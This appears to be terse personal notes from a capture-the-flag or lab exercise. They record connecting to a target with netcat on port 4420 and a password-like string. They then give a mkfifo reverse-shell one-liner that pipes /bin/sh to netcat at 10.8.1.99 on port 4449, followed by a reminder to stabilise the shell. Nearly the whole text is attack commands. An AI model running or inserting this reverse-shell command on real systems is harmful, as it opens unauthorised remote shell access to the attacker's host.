```
connect 

nc 10.10.160.204 4420
sardinethecat

shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.99 4449 >/tmp/f


stable


```